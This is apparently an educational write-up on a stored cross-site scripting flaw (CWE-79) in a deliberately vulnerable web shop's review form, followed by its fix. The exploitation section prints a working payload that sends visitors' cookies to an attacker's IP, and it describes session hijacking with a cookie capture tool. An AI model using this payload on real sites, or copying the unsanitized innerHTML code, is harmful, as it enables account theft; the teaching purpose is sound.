# CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

## Index
The analysis of the implementation of this vulnerability is divided in the following sections:

1. [Explanation](#explanation)
2. [Implementation](#implementation)
    - [Posssible exploitation](#posssible-exploitation)
4. [Mitigation](#mitigation)
5. [Examples](#examples)

## Explanation

- What is [CWE-79](https://cwe.mitre.org/data/definitions/79.html)

> *The software does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users.*
> 
> by **Common Weakness Enumeration**

Most commonly, Cross-site Scripting (better known as XSS), is the execution of scripts that were not created by the server, but rather inserted by an attacker in an unsanitized input, that results in the server not recognizing it as a foreign script and thus executing it generating a response (Reflected XSS) or storing it and executing it in the future to other users (Stored XSS).

## Implementation

- **How** it was implemented  

This particular projetct is vulnerable to **stored XSS** as the concept is that an attacker pretends to perform a **session hijack** by retrieving another users cookie.

In this site it's possible for users to post reviews on the page for every specific product, this is **only possible when a user is logged on**, otherwise,as a common non logged user, one can only read the reviews already posted, but does not have access to the **form to post** it's own.

This HTML form is as follows:
```html
<div class="form-floating logged">
    <textarea class="form-control" placeholder="Leave a comment here" id="comment"></textarea>
    <label for="comment">Comentar</label>
    <a type="button" class="btn btn-outline-dark me-2" onclick="post_review();">Submit</a>
</div>
```
Here, the class **logged** is by definition hidden:
```css
.logged {
  visibility: hidden;
  display: none;
}
```
It is **made visible dynamically** by means of Javascript, has many other elements in the website, by adding the **visible** class wich overrides **logged**
```css
.visible {
  visibility: visible;
  display: initial;
}
```
So this will be the element shown to the logged in user:
```html
<div class="form-floating logged visible"> 
    ...
```   

All this adaptability of the site is handled by the Javascript function in main **show_hide()** that is called **on load** in the **body tag** of everypage. It checks if the **session** variable is **0** or **1** (this variable is set on **log in**) and dictates if elements are made visible or not.

This is the function:
```javascript
function show_hide() {
    admin = sessionStorage.getItem('admin');
    session = sessionStorage.getItem('session');    // <-- !!!
    credit = sessionStorage.getItem('credit');

    var loggedlist = document.getElementsByClassName("logged");
    var adminlist = document.getElementsByClassName("admin");
    var login_btn = document.getElementById("login_btn")
    if (session == 1) {
        document.getElementById("signup_btn").style.visibility = "hidden";
        document.getElementById("signup_btn").style.display = "none";
        document.getElementById("credits").innerHTML = credit;
        document.getElementById("credits").value = sanitize(credit);
        login_btn.innerHTML = "Logout";
        login_btn.setAttribute("onclick", "logout();")
        login_btn.removeAttribute("href");
        for (var i = 0; i < loggedlist.length; i++) {
            loggedlist[i].classList.add("visible");     // <-- !!!
        }
        if (admin != 0) {
            for (var i = 0; i < adminlist.length; i++) {
                adminlist[i].classList.add("visible");      // <-- !!!
            }
            var nav = document.getElementById("nav");
            var li = document.createElement("li");
            li.setAttribute("id", "stock_btn");

            var a = document.createElement("a");
            a.setAttribute("href", sessionStorage.getItem('stocklink'));
            a.className = "nav-link px-2 text-warning";
            a.innerHTML = "Stock Management"

            li.appendChild(a);
            nav.appendChild(li);
        }
    } else {
        document.getElementById("signup_btn").style.visibility = "visible";
        document.getElementById("signup_btn").style.display = "inline";
        login_btn.innerHTML = "Login";
        login_btn.removeAttribute("onclick");
        login_btn.setAttribute("href", "login");
        document.getElementById("stock_btn").remove();
        for (var i = 0; i < loggedlist.length; i++) {
            loggedlist[i].classList.remove("visible");
        }
        for (var i = 0; i < adminlist.length; i++) {
            adminlist[i].classList.remove("visible");
        }
    }
}
```
All this is quite good, but it is not here that the XSS flaw occurs, bot non the less, it is important to explain that **only logged in users** can post reviews.

When a post review is written in the form shown above, the value of it's input (wich has **id = comment**) is taken and **post_review()** is called, let's take a look at this function
```javascript
function post_review() {
    var queryString = window.location.search;
    var urlParams = new URLSearchParams(queryString);
    id = urlParams.get("id");
    id = sanitize(id);

    var list = document.getElementById("comments");     // <-- !!!
    list.textContent = '';

    var comment = document.getElementById("comment");

    data = { "product_id": encode64(id), "comment": encode64(comment.value), };     // <-- !!!
    comment.textContent = '';

    $.ajax({
        type: "POST",
        url: "post_review",
        data: JSON.stringify(data),
        contentType: "application/json",
        dataType: "json",
    }).done(get_reviews(id));
}
```
As we can see in the **lines commented**, the value of the input is taken **directly** and passed via JSON in a POST request to the **server side**

On the **server side** the Python function will taken the JSON received, and **without sanitization** insert it's values into a **SQL table** for the reviews
```python
@cherrypy.expose
@cherrypy.tools.json_out()
@cherrypy.tools.json_in()
def post_review(self):
    input = cherrypy.request.json
    comment = decode64(input["comment"])
    username = cherrypy.session[cherrypy.session.id]
    product_id = decode64(input["product_id"])

    db = sqlite3.connect("database.db")
    cur = db.cursor()

    com = """INSERT INTO reviews (product_id, username, comment) VALUES (?,?,?)"""
    arg = (product_id, username, comment)
    match = cur.execute(com, arg)

    db.commit()
    db.close()
```
Thus far we have seen the process by wich a vulnerable comment input, can result into the possibility of **storing** a **XSS attack** in a perment manner in the **website's database**, possibly **exposing it to other users**

This however is not a critical concern if **when** the comments are **loaded**, they were to be **sanitized**, but what if this doesn't happen ? Lets see bellow a example of it
```javascript
    function get_reviews(id) {
    data = { "id": encode64(id), };
    $.ajax({
        type: "POST",
        url: "product_reviews",
        data: JSON.stringify(data),
        contentType: "application/json",
        dataType: "json",
        success: function (data) {
            response = jQuery.parseJSON(data);
            var list = document.getElementById("comments");
            for (var i = 0; i < response.length; i++) {
                var li = document.createElement("li");
                li.className = "list-group-item";

                var h6 = document.createElement("h6");
                    h6.innerHTML = response[i][2];      // <-- !!!

                var p = document.createElement("p");
                    p.innerHTML = response[i][3];      // <-- !!!

                li.appendChild(h6);
                li.appendChild(p);
                list.appendChild(li);
            }
        }
    });
}
```
Once again, we can see that **even being dynamically loaded to the page**, the comments are put **directly as inner HTML** without being processed in any way, shape or form. This is what **exposes other users** to the malicious script

### Posssible exploitation

As said in the beginning,the goal of our hypothetical attacker is to perform a **session hijack** by stealling other users cookie, for this to be possible, our website contains another **critical** flaw, by not using the **HttpOnly** atribute in it's cookies.

#### How to setup

- **Server side** 

The concept of the **"cookie stealing"** is quite simple from the server side, you can [download](cookie_capture_tool.py) the tool in this directory, inside there is a simple explanation of how it works, but the only this that it does is **receive GET requests** and **saving** its respective **parameters to a text file**, and **ridirecting the user back to the URL** wich he/she as came from. The only thing the attacker as to provide is the **local IP** of the machine serving that microservice.

By running the following comand in the directory were you've downloaded the *cookie_capture_tool.py* file, one is all setup up to perform de **XSS attack**
```bash
$ python3 cookie_capture_tool.py
```

- **Client side**
 
Since the input of the comment is not sanitized, and having created an account, the attacker can post scripts, like the one below, in the post form
```html
<p onmouseover="window.location='http://<your local ip>:<port>/?c='+document.cookie+'&u='+window.location.href;">Innocent comment :)<p>
```
*Lets assume a imaginary IP of 192.169.19.16 and use the default port of de tool of 5000, resulting in*
```html
<p onmouseover="window.location='http://192.169.19.16:5000/?c='+document.cookie+'&u='+window.location.href;">Innocent comment :)<p>
```
This carefully crafted comment, is nothing more than a simple HTML element containing a **event attribute** *(since dynamically inserted <script></script> tags as not executed by the browsers)* that triggers the Javascript code bellow.
```javascript
window.location='http://192.169.19.16:5000/?c='+document.cookie+'&u='+window.location.href;
```
    
What this code does is, when a user **drags the mouse over the exploited comment**, send a **GET request** to our **cookie_capture_tool microservice**, passsing the **users cookie** and current **webpage URL**. The tool will **write the cookie to a text file**, and **ridirect the user back** to the **url** were the user was. Since this is done very quickly, to the average user just appears as the page is reloading

After this, is just a question of openning a the developer _Developer tools_ in a the browser openned in the website and inserting the captured cookie, for that point on we can interact with the website as if we were the other user

## Mitigation

- How do we fix it ?

Even though XSS can result in pretty severe security flaws, it's mitigation is quite simple, only requiering carefully sanitization of user input, and neutralization of the fields that users are not supposed to input data into, this can include **form inputs** but also **GET parameters** by modifying the **URL** . (this second does not apply to this case)

The principal goal of sanitizing against **XSS** it to know how to **escape** the most obvious **symbols** used in **HTML** so the website, when inserting the user generated content **does not** assumes it as an **HTML entity**.

This is done by converting this particular sign to their respectively **Unicode** codes; by doing this they are not assumed to be the same as the rest of the symbols in the HTML code, but the **browser** can still **translate them to their corresponding characters**

In sum, we must **convert** the symbols that can be perceived as a **HTML entities** and translate them to **Unicode** characters

This is done in the **sanitize()** function in **main**
```javascript
function sanitize(comment) {
    return String(comment).replace(/[^\w. ]/gi, function (c) {
        return '&#' + c.charCodeAt(0) + ';';
    });
}
````
With this the previous codes suffers the following changes:

1. **get_review()**
```javascript
From this ⬇️

var h6 = document.createElement("h6");
h6.innerHTML = response[i][2];

var p = document.createElement("p");
p.innerHTML = response[i][3];

To this ⬇️

var h6 = document.createElement("h6");
h6.innerHTML = sanitize(response[i][2]);

var p = document.createElement("p");
p.innerHTML = sanitize(response[i][3]);
```

2. **Cherrypy configuration** - although not directly affecting XSS, given the example of **"cookie stealing"** we should set the following
```python
"tools.sessions.httponly": "True",
```

## Examples

### Vulnerable


![Vulnerable](CWE-79-vulnerable.gif)

---

### Safe


![Safe](CWE-79-safe.gif)
